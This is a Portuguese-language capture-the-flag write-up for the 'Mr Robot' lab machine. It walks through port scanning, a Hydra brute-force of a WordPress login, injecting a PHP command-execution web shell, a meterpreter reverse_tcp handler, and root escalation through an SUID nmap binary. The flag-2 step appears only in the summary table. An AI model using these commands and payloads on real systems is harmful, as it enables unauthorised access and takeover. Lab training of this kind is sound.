Mr Robot CTF - Full Report

Objetivo
Explorar vulnerabilidades em uma máquina baseada na série Mr. Robot, capturando 3 flags através de exploração web, quebra de hashes e escalação de privilégios.

🛠️ Ferramentas Utilizadas
Ferramenta		Comando/Exemplo	Finalidade
Nmap			nmap -sV -p- 10.10.10.10	Varredura de portas e serviços
Dirb			dirb http://10.10.10.10	Enumeração de diretórios web
John the Ripper	john 	hash.txt --wordlist=rockyou.txt	Quebra de hashes
Metasploit		use exploit/unix/webapp/wp_admin_shell_upload	Exploração WordPress


🔍 Passo a Passo Detalhado
1. Enumeração Inicial

Comando Nmap:
nmap -sV -sC -p- 10.10.10.10 -oN scan.txt


Serviços Encontrados:
80/tcp  open  http    Apache httpd  
443/tcp open  ssl/http Apache httpd  


2. Exploração Web

2.1. Robots.txt:
Acessando http://10.10.10.10/robots.txt encontramos:
User-agent: *  
Disallow: /fsocity.dic  
Disallow: /key-1-of-3.txt  

Flag 1: key-1-of-3.txt (no diretório raiz)


2.2. Wordlist Vazada:
O arquivo fsocity.dic contém credenciais possíveis para brute force.


2.3. Login WordPress:

URL: http://10.10.10.10/wp-login.php
Usuário encontrado: elliot

Quebra de senha com Hydra:
hydra -l elliot -P fsocity.dic 10.10.10.10 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect"

Senha encontrada: ER28-9U2


3. Exploração do WordPress

3.1. Upload de Shell Reverso:
Usar o plugin Theme Editor para injetar um payload PHP:
<?php system($_GET['cmd']); ?>

Acessar o shell em:
http://10.10.10.10/wp-content/themes/twentyfifteen/cmd.php?cmd=id


3.2. Shell Interativo:

Usar Metasploit para obter shell estável:

msfconsole  
use exploit/multi/handler  
set payload linux/x86/meterpreter/reverse_tcp  
set LHOST seu_ip  
exploit


4. Escalação de Privilégios

4.1. Encontrar Binários SUID:
find / -perm -4000 2>/dev/null  

Resultado: /usr/local/bin/nmap (versão antiga com modo interativo)


4.2. Abuso do Nmap:
/usr/local/bin/nmap --interactive  
nmap> !sh  
whoami  # root!  

Flag 3: /root/key-3-of-3.txt


🏆 Artefatos Coletados
Flag		Localização			Método de Captura
key-1		/key-1-of-3.txt			Robots.txt
key-2		/home/robot/key-2-of-3.txt	Quebra de hash MD5 (cat password.raw-md5)
key-3		/root/key-3-of-3.txt		Escalação via SUID (nmap)


💡 Lições Aprendidas
Robots.txt pode vazar arquivos sensíveis
WordPress é alvo comum (plugins/usuários fracos)
Binários SUID são vetores poderosos de escalação

